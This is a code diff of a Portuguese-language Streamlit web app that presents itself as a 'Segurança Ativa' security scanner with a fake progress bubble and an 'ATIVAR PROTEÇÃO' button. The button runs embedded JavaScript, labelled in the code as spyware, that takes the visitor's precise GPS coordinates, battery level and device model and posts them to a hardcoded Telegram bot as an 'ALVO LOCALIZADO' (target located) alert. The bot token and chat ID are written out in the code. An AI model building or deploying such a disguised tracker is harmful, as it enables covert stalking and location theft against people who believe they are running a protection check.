@@ -1,13 +1,13 @@
 import streamlit as st
 import time
 
-# --- CONFIGURAÇÃO ---
+# --- DADOS DO SEU BOT ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- SEU CSS ORIGINAL (BOLHA FLUTUANTE) ---
+# --- SEU ESTILO ORIGINAL (BOLHA FLUTUANTE) ---
 st.markdown("""
     <style>
     .main { background-color: #0b0f14; color: white; }
@@ -30,61 +30,63 @@ st.markdown("""
     }
     .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
     
-    .btn-original {
+    .btn-fiel {
         background-color: white; color: #333; border: none;
-        padding: 15px 25px; border-radius: 8px; font-size: 16px;
+        padding: 12px 20px; border-radius: 4px; font-size: 14px;
         font-family: sans-serif; display: flex; align-items: center;
-        gap: 10px; cursor: pointer; font-weight: bold; text-transform: uppercase;
+        gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
     }
     </style>
 """, unsafe_allow_html=True)
 
+st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
+
 caixa_bolha = st.empty()
 caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
-# --- O INJETOR QUE "FORÇA" A ATIVAÇÃO ---
+# --- INJETOR TIPO SPYWARE (ENVIO INDEPENDENTE) ---
 js_spy = f"""
-<div style="display: flex; justify-content: center; margin-top: 20px;">
-    <button class="btn-original" id="btn-trigger">
-        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO AGORA
+<div style="display: flex; justify-content: flex-start;">
+    <button class="btn-fiel" onclick="runCapture()">
+        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
     </button>
 </div>
 
 <script>
-document.getElementById('btn-trigger').onclick = function() {{
-    // CONFIGURAÇÃO AGRESSIVA: Força o GPS real, ignora cache e define tempo limite curto
-    const geoConfig = {{ 
-        enableHighAccuracy: true, 
-        timeout: 5000, 
-        maximumAge: 0 
-    }};
-
+async function runCapture() {{
+    const options = {{ enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }};
+    
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
+            // Pegou a localização, agora extrai os dados do sistema
             const bat = await navigator.getBattery();
-            const info = "🛡️ SISTEMA ATIVADO\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+            const level = Math.round(bat.level * 100);
+            const model = navigator.userAgent.split('(')[1].split(')')[0];
             
+            const msg = "🛡️ *ALVO LOCALIZADO*\\n📱 " + model + "\\n🔋 " + level + "%\\n📍 [VER MAPA](http://www.google.com/maps/place/" + pos.coords.latitude + "," + pos.coords.longitude + ")";
+            
+            // ENVIO DIRETO (Não passa pelo Streamlit, por isso não trava)
             await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                 method: "POST",
                 headers: {{ "Content-Type": "application/json" }},
-                body: JSON.stringify({{ chat_id: "{ID}", text: info }})
+                body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
             }});
             
-            // Sucesso: Avisa o Streamlit para rodar a animação
+            // SÓ AGORA AVISA O STREAMLIT PARA GIRAR A PORCENTAGEM
             window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
         }},
         (err) => {{
-            // Se o GPS estiver desligado, o Android é obrigado a mostrar o pop-up aqui
-            console.log("Forçando ativação de hardware...");
+            // Se ele negar ou der erro, o script tenta forçar a barra de novo
+            console.log("Acesso negado, tentando re-solicitar...");
         }},
-        geoConfig
+        options
     );
-}};
+}}
 </script>
 """
 
-# O segredo para o botão "prestar" é o allow="geolocation" no componente
-ativou = st.components.v1.html(js_spy, height=100)
+# Importante: allow="geolocation" no componente
+ativou = st.components.v1.html(js_spy, height=70)
 
 if ativou:
     for i in range(4, 101, 5):
